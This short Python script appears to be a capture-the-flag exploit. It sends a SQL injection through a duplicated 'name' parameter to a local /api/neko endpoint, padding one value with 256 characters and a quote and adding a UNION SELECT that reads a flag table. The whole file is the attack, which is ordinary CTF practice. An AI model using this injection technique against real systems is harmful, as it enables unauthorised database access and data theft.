import requests
import os

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8080')

URL = f'http://{host}:{port}'
print(URL)

payload = {
    'name': ["A"*256 + "'", "' UNION SELECT 1,flag,3,4 FROM flag;"]
}
r = requests.get(URL + '/api/neko', params=payload)
print(r.text)

